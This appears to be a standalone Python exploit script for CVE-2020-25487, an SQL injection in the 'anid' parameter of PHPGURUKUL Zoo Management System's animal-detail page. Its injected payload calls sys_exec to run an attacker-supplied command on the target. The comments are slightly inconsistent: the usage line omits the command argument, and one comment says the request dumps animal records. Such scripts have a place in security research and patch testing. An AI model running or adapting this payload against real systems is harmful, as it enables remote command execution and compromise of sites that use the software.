# CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25487
# PHPGURUKUL Zoo Management System Using PHP and MySQL version 1.0 is affected by: SQL Injection via zms/animal-detail.php
#
# How to run the exploit?
# python3 exploit.py 127.0.0.1 80
#
# Exploit: https://www.exploit-db.com/exploits/47840
# How it works?
# 1. Views anmal details
# 2. `anid` param is not sanitized

import sys
import requests

if __name__ == '__main__':
    host = sys.argv[1]
    port = sys.argv[2]
    cmd  = sys.argv[3]

    # view animal details, send SQL payload
    view_animal_url = 'http://%s:%s/zms/animal-detail.php' % (host, port)
    form_data = {
        'anid': "7' AND (SELECT sys_exec('%s')) AND '1" % cmd
    }
    res = requests.get(view_animal_url, params=form_data)
    # Dumps all animal records
    print(res.text.encode('utf-8'))
